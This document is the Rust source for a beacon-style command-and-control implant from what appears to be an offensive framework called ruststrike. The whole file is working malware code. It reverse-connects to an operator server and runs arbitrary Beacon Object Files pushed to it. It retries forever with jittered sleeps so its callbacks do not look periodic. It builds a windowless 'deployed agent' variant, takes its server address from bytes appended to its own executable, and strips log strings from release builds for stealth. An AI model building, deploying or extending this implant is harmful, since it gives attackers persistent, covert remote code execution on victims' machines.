//! ruststrike-beacon: a beacon-style implant.
//!
//! Like `ruststrike-implant` it reverse-connects to the server over the same
//! newline-JSON wire protocol (`ruststrike-protocol`) and runs BOFs in-process
//! via the loader. The difference is **reconnection behavior**: a beacon does
//! NOT exit when the server closes the stream or is unreachable. It sleeps a
//! configurable callback interval (with optional jitter) and re-checks in,
//! forever — so an operator can restart the server (or take it down
//! temporarily) without losing the agent. On each successful check-in it sends
//! a `hello` so the core registers the session, then pumps commands until the
//! stream ends.
//!
//! Config sources (first wins per field — CLI flag, then positional, then env,
//! then the appended-config trailer, then defaults):
//!
//!   beacon <host> [port] [interval_secs] [--jitter <pct>] [--host H] [--port P]
//!                                   [--interval S] [--jitter J]
//!   env:  BEACON_HOST / BEACON_PORT / BEACON_INTERVAL (secs) / BEACON_JITTER (pct)
//!   trailer: the same opaque magic the implant uses (`host\0port\0` appended to
//!            the exe) — lets a patched stub check in with no args.
//!   defaults: 127.0.0.1:4444, interval 5s, jitter 0%.
//!
//! Two bin targets link this lib:
//!   - `ruststrike-beacon`        — console subsystem (dev)
//!   - `ruststrike-beacon-silent` — GUI subsystem (no window; deployed agent)

use anyhow::{Context, Result};
use ruststrike_loader::run_bof;
use ruststrike_protocol::{decode_bof, ImplantMessage, ServerMessage};
use std::io::{BufRead, BufReader, BufWriter, Read, Seek, Write};
use std::net::TcpStream;
use std::sync::mpsc;
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

/// Verbose log macro. Compiles to a no-op unless the `verbose` feature is on,
/// so the format strings are absent from a default release build (same OPSEC
/// gating as the implant's `vlog!`). Wrapped in a block so it's valid in both
/// statement and expression position (e.g. inside a `match` arm).
macro_rules! vlog {
    ($($arg:tt)*) => {{
        #[cfg(feature = "verbose")]
        eprintln!($($arg)*);
    }};
}

/// Magic marker the stub builder appends to a prebuilt exe so it reverse-
/// connects to a baked-in host:port without CLI args. Layout:
///   <exe bytes>... <TRAILER_MAGIC> <host> "\x00" <port> "\x00"
/// The beacon reads the last ~512 bytes of its own exe to find it. This is the
/// SAME opaque byte sequence the implant uses, so the existing stub builder
/// (`tools/stubbuilder` + `/api/stub/build`) can patch a beacon exe too.
const TRAILER_MAGIC: &[u8] = &[0x7C, 0x53, 0x9A, 0x2E, 0xD1, 0x04, 0xB8, 0x6F, 0x11, 0xA3];

/// Resolved beacon configuration. `interval` is the sleep between check-ins
/// (i.e. the reconnection cadence); `jitter` is the ±fraction applied to that
/// sleep (0.0..=0.5) to avoid a perfectly periodic callback pattern.
#[derive(Debug, Clone)]
struct Config {
    host: String,
    port: u16,
    interval: Duration,
    jitter: f64,
}

/// Beacon entry point. Resolves config, then loops forever: check in, pump
/// until the stream ends (server closed / dropped), sleep `interval` (±jitter),
/// repeat. Never returns under normal operation — only an unwind/panic stops
/// it. Shared by the console and silent (GUI-subsystem) bin targets.
pub fn run() -> Result<()> {
    let cfg = Config::resolve();
    vlog!(
        "[beacon] {}:{} interval={:?} jitter={:.0}%",
        cfg.host,
        cfg.port,
        cfg.interval,
        cfg.jitter * 100.0
    );
    loop {
        match check_in(&cfg) {
            Ok(()) => vlog!("[beacon] stream ended cleanly"),
            Err(e) => {
                let _ = &e; // referenced only by vlog! (verbose feature)
                vlog!("[beacon] check-in failed: {e:#}")
            }
        }
        let sleep = jittered(cfg.interval, cfg.jitter);
        vlog!("[beacon] sleeping {:?} before next check-in", sleep);
        thread::sleep(sleep);
    }
}

/// One check-in cycle: connect to the core, send a proactive `hello`, spawn the
/// reader thread, and pump outbound replies until the stream ends. Returns when
/// the server closes the connection (or the dial fails) so `run()` can sleep
/// and retry. Errors are non-fatal — they just feed the log before the retry.
fn check_in(cfg: &Config) -> Result<()> {
    let addr = format!("{}:{}", cfg.host, cfg.port);
    let stream = TcpStream::connect(&addr).with_context(|| format!("connecting {addr}"))?;
    vlog!("[beacon] connected to {addr}");

    let read_stream = stream.try_clone().context("cloning stream")?;
    let writer = BufWriter::new(stream);

    let (tx, rx) = mpsc::channel::<ImplantMessage>();
    let send_tx = tx.clone();

    // Reader thread: server -> dispatch. Exits when the stream ends; dropping
    // `send_tx` closes the channel so the main loop's `rx.iter()` returns.
    thread::spawn(move || reader_loop(read_stream, send_tx));
    drop(tx);

    let mut writer = writer;
    // Proactive check-in so the core sees the beacon the moment it connects
    // (the core also registers on TCP accept, but the hello disambiguates a
    // beacon from the stock implant and carries the "beacon" marker).
    let _ = send(&mut writer, &ImplantMessage::Hello {
        data: "beacon".to_string(),
    });

    for msg in rx.iter() {
        if send(&mut writer, &msg).is_err() {
            vlog!("[beacon] connection lost");
            break;
        }
    }
    Ok(())
}

/// Reader/dispatch loop. Mirrors the implant's: one JSON `ServerMessage` per
/// line → `handle` → reply on the channel. Exits on EOF or read error.
fn reader_loop(stream: TcpStream, tx: mpsc::Sender<ImplantMessage>) {
    let mut reader = BufReader::new(stream);
    let mut line = String::new();
    loop {
        line.clear();
        match reader.read_line(&mut line) {
            Ok(0) => {
                vlog!("[beacon] server closed connection");
                break;
            }
            Ok(_) => {
                let trimmed = line.trim();
                if trimmed.is_empty() {
                    continue;
                }
                let msg = match serde_json::from_str::<ServerMessage>(trimmed) {
                    Ok(m) => m,
                    Err(e) => {
                        let _ = tx.send(ImplantMessage::Error {
                            data: format!("bad request ({e})"),
                        });
                        continue;
                    }
                };
                let reply = handle(msg);
                if tx.send(reply).is_err() {
                    break;
                }
            }
            Err(e) => {
                let _ = &e; // referenced only by vlog! (verbose feature)
                vlog!("[beacon] read error: {e}");
                break;
            }
        }
    }
}

/// Dispatch a server message to a reply. `Hello` and `Bof` behave exactly as in
/// the stock implant (same loader, same BOF arg decoding). Relay is declined —
/// a beacon's connection is intermittent (it sleeps between check-ins), so a
/// long-lived pivot listener on it is not meaningful; the core gets a
/// `relay_error` / `relay_stopped` so it doesn't wait on `relay_started`.
fn handle(msg: ServerMessage) -> ImplantMessage {
    match msg {
        ServerMessage::Hello => ImplantMessage::Hello {
            data: "ready".to_string(),
        },
        ServerMessage::Bof { file, args } => {
            let coff = match decode_bof(&file) {
                Ok(b) => b,
                Err(e) => {
                    return ImplantMessage::Error {
                        data: format!("decode: {e}"),
                    };
                }
            };
            let args_bytes = decode_bof(&args).unwrap_or_default();
            match run_bof(&coff, &args_bytes) {
                Ok(output) => ImplantMessage::Output { data: output },
                Err(e) => ImplantMessage::Error {
                    data: format!("exec: {e:#}"),
                },
            }
        }
        ServerMessage::RelayListen { relay_id, .. } => ImplantMessage::RelayError {
            relay_id,
            data: "beacon mode: relay unsupported (intermittent link)".to_string(),
        },
        ServerMessage::RelayStop { relay_id } => ImplantMessage::RelayStopped { relay_id },
    }
}

fn send(writer: &mut BufWriter<TcpStream>, msg: &ImplantMessage) -> Result<()> {
    writer.write_all(msg.to_json().as_bytes())?;
    writer.write_all(b"\n")?;
    writer.flush()?;
    Ok(())
}

/// Apply ±`jitter` to `base`. With jitter=0 the base is returned unchanged.
/// `jitter` is clamped to [0, 0.5] at config time so the result never goes
/// negative or to zero.
fn jittered(base: Duration, jitter: f64) -> Duration {
    if jitter <= 0.0 {
        return base;
    }
    let r = next01(); // 0..1
    let factor = 1.0 + (r * 2.0 - 1.0) * jitter; // 1 ± jitter
    let factor = factor.max(0.25);
    base.mul_f64(factor)
}

// --- tiny deterministic-enough RNG for jitter (no external dep) -------------
// A xorshift64 seeded from the wall clock per thread. Jitter doesn't need
// cryptographic quality — just enough to avoid a perfectly periodic callback.

thread_local! {
    static RNG: std::cell::Cell<u64> = std::cell::Cell::new(seed());
}

fn seed() -> u64 {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0x9E37_79B9_7F4A_7C15);
    nanos | 1 // xorshift needs a nonzero state
}

fn next_u64() -> u64 {
    RNG.with(|c| {
        let mut s = c.get();
        if s == 0 {
            s = seed();
        }
        s ^= s << 13;
        s ^= s >> 7;
        s ^= s << 17;
        c.set(s);
        s
    })
}

/// Uniform float in [0, 1).
fn next01() -> f64 {
    (next_u64() >> 11) as f64 / ((1u64 << 53) as f64)
}

// --- config resolution ------------------------------------------------------

impl Config {
    fn resolve() -> Config {
        let args: Vec<String> = std::env::args().skip(1).collect();
        let mut host: Option<String> = None;
        let mut port: Option<u16> = None;
        let mut interval: Option<u64> = None;
        let mut jitter_pct: Option<f64> = None;

        let mut i = 0;
        while i < args.len() {
            let a = &args[i];
            // long/short flags with an explicit value
            if (a == "--jitter" || a == "-j") && i + 1 < args.len() {
                jitter_pct = args[i + 1].parse::<f64>().ok();
                i += 2;
                continue;
            } else if a == "--interval" && i + 1 < args.len() {
                interval = args[i + 1].parse::<u64>().ok();
                i += 2;
                continue;
            } else if a == "--host" && i + 1 < args.len() {
                host = Some(args[i + 1].clone());
                i += 2;
                continue;
            } else if a == "--port" && i + 1 < args.len() {
                port = args[i + 1].parse::<u16>().ok();
                i += 2;
                continue;
            } else if host.is_none() {
                host = Some(a.clone());
            } else if port.is_none() {
                port = a.parse::<u16>().ok();
            } else if interval.is_none() {
                interval = a.parse::<u64>().ok();
            }
            i += 1;
        }

        // Trailer is the floor for host:port (a patched stub), CLI/env override.
        let (t_host, t_port) = read_trailer_config().unwrap_or(("127.0.0.1".to_string(), 4444));

        let host = host
            .or_else(|| env("BEACON_HOST"))
            .unwrap_or(t_host);
        let port = port
            .or_else(|| env("BEACON_PORT").and_then(|s| s.parse().ok()))
            .unwrap_or(t_port);
        let interval_secs = interval
            .or_else(|| env("BEACON_INTERVAL").and_then(|s| s.parse().ok()))
            .unwrap_or(5);
        let jitter_pct = jitter_pct
            .or_else(|| env("BEACON_JITTER").and_then(|s| s.parse().ok()))
            .unwrap_or(0.0);
        let jitter = (jitter_pct / 100.0).clamp(0.0, 0.5);

        Config {
            host,
            port,
            interval: Duration::from_secs(interval_secs),
            jitter,
        }
    }
}

fn env(key: &str) -> Option<String> {
    std::env::var(key).ok().filter(|s| !s.is_empty())
}

/// Read the appended-config trailer from this exe, if present. Same logic as
/// the implant's `read_trailer_config`: reads only the last 512 bytes, finds
/// the opaque magic, parses `host\0port\0`. Returns None if absent/malformed.
fn read_trailer_config() -> Option<(String, u16)> {
    let exe_path = std::env::current_exe().ok()?;
    let mut f = std::fs::File::open(&exe_path).ok()?;
    let len = f.metadata().ok()?.len();
    if len == 0 {
        return None;
    }
    let window: u64 = 512;
    let start = len.saturating_sub(window);
    f.seek(std::io::SeekFrom::Start(start)).ok()?;
    let mut tail = Vec::with_capacity((len - start) as usize);
    f.read_to_end(&mut tail).ok()?;
    let idx = find_subslice(&tail, TRAILER_MAGIC)?;
    let body = &tail[idx + TRAILER_MAGIC.len()..];
    let host_end = body.iter().position(|&b| b == 0)?;
    let host = std::str::from_utf8(&body[..host_end]).ok()?.to_string();
    let rest = &body[host_end + 1..];
    let port_end = rest.iter().position(|&b| b == 0).unwrap_or(rest.len());
    let port: u16 = std::str::from_utf8(&rest[..port_end]).ok()?.parse().ok()?;
    if host.is_empty() || port == 0 {
        return None;
    }
    Some((host, port))
}

fn find_subslice(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || needle.len() > haystack.len() {
        return None;
    }
    haystack
        .windows(needle.len())
        .position(|w| w == needle)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::TcpListener;

    /// The beacon's core guarantee: when the server closes the stream, a
    /// check-in returns cleanly so `run()`'s loop can sleep and reconnect —
    /// and the NEXT check-in succeeds against a fresh accept. This drives two
    /// full cycles (connect → hello → server close → return → reconnect) which
    /// is exactly what `run()` does, just bounded for the test.
    #[test]
    fn reconnects_after_server_close() {
        let ln = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = ln.local_addr().unwrap();
        let cfg = Config {
            host: addr.ip().to_string(),
            port: addr.port(),
            interval: Duration::from_millis(1),
            jitter: 0.0,
        };

        for cycle in 0..2 {
            // Beacon connects on its own thread (check_in does the dial).
            let cfg_c = cfg.clone();
            let beacon = thread::spawn(move || check_in(&cfg_c));

            let (s, _) = ln.accept().expect("beacon connects");
            // Read the proactive hello the beacon sends on connect. Scope the
            // reader + its stream clone so they're dropped BEFORE we join —
            // otherwise the test-side TcpStream clone keeps the connection
            // half-open, the beacon never sees EOF, and check_in never returns
            // (a deadlock).
            {
                let mut r = BufReader::new(s.try_clone().unwrap());
                let mut line = String::new();
                r.read_line(&mut line).expect("hello line");
                assert!(
                    line.contains("\"type\":\"hello\""),
                    "cycle {cycle}: expected hello, got: {line:?}"
                );
                assert!(line.contains("beacon"), "cycle {cycle}: hello data missing beacon marker");
            }
            // All test-side handles closed → beacon's reader gets EOF → check_in
            // returns, proving it can sleep and reconnect.
            drop(s);
            let check_in_result = beacon
                .join()
                .expect("check_in thread panicked");
            check_in_result.expect("check_in returns after close (enabling reconnect)");
        }
        // Two cycles completed => the beacon reconnected after the first close.
    }

    /// If the server is down, check_in errors (not panics) — `run()` logs and
    /// retries. This is the "don't stop connecting when the server is gone"
    /// behavior.
    #[test]
    fn check_in_fails_cleanly_when_server_down() {
        // Bind + immediately drop to grab a free but closed port.
        let ln = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = ln.local_addr().unwrap();
        drop(ln);

        let cfg = Config {
            host: addr.ip().to_string(),
            port: addr.port(),
            interval: Duration::from_millis(1),
            jitter: 0.0,
        };
        // Should be an Err (connection refused), NOT a panic.
        let res = check_in(&cfg);
        assert!(res.is_err(), "expected connect failure, got {res:?}");
    }

    #[test]
    fn jitter_zero_returns_base() {
        let base = Duration::from_secs(10);
        assert_eq!(jittered(base, 0.0), base);
        assert_eq!(jittered(base, -1.0), base);
    }

    #[test]
    fn jitter_stays_within_band() {
        let base = Duration::from_secs(100);
        // With 50% jitter the result must be within [25, 150] ms-equivalent
        // (clamp floor is 0.25×). Sample several draws.
        for _ in 0..64 {
            let d = jittered(base, 0.5);
            assert!(d >= Duration::from_secs(25), "under band: {d:?}");
            assert!(d <= Duration::from_secs(150), "over band: {d:?}");
        }
    }

    #[test]
    fn rng_produces_spread() {
        // Two consecutive draws from a decent RNG should differ almost always.
        let a = next01();
        let b = next01();
        let c = next01();
        // At least one of the three pairs differs.
        assert!(a != b || b != c, "RNG looks stuck: {a} {b} {c}");
        assert!((0.0..1.0).contains(&a));
    }

    /// Trailer parse logic against a synthetic tail (mirrors the implant test;
    /// read_trailer_config reads its own exe so we exercise the parse path).
    #[test]
    fn parses_trailer_from_tail() {
        let mut tail = b"some padding bytes that are not the magic\0\0".to_vec();
        tail.extend_from_slice(TRAILER_MAGIC);
        tail.extend_from_slice(b"10.0.0.5");
        tail.push(0);
        tail.extend_from_slice(b"4455");
        tail.push(0);
        let idx = find_subslice(&tail, TRAILER_MAGIC).expect("magic present");
        let body = &tail[idx + TRAILER_MAGIC.len()..];
        let host_end = body.iter().position(|&b| b == 0).unwrap();
        let host = std::str::from_utf8(&body[..host_end]).unwrap().to_string();
        let rest = &body[host_end + 1..];
        let port_end = rest.iter().position(|&b| b == 0).unwrap();
        let port: u16 = std::str::from_utf8(&rest[..port_end]).unwrap().parse().unwrap();
        assert_eq!(host, "10.0.0.5");
        assert_eq!(port, 4455);
    }

    #[test]
    fn no_trailer_returns_none() {
        let tail = b"just some exe bytes with no magic marker at all".to_vec();
        assert!(find_subslice(&tail, TRAILER_MAGIC).is_none());
    }

    /// Config::resolve honors BEACON_INTERVAL / BEACON_JITTER env when no CLI
    /// arg is given (temp-env style: save/restore since tests share a process).
    #[test]
    fn config_reads_env() {
        let prev_i = std::env::var("BEACON_INTERVAL").ok();
        let prev_j = std::env::var("BEACON_JITTER").ok();
        std::env::set_var("BEACON_INTERVAL", "13");
        std::env::set_var("BEACON_JITTER", "25");
        // No CLI args here (test binary has none relevant), so env wins.
        let cfg = Config::resolve();
        assert_eq!(cfg.interval, Duration::from_secs(13));
        assert!((cfg.jitter - 0.25).abs() < 1e-9, "jitter clamped: {}", cfg.jitter);
        // restore
        match prev_i {
            Some(v) => std::env::set_var("BEACON_INTERVAL", v),
            None => std::env::remove_var("BEACON_INTERVAL"),
        }
        match prev_j {
            Some(v) => std::env::set_var("BEACON_JITTER", v),
            None => std::env::remove_var("BEACON_JITTER"),
        }
    }
}
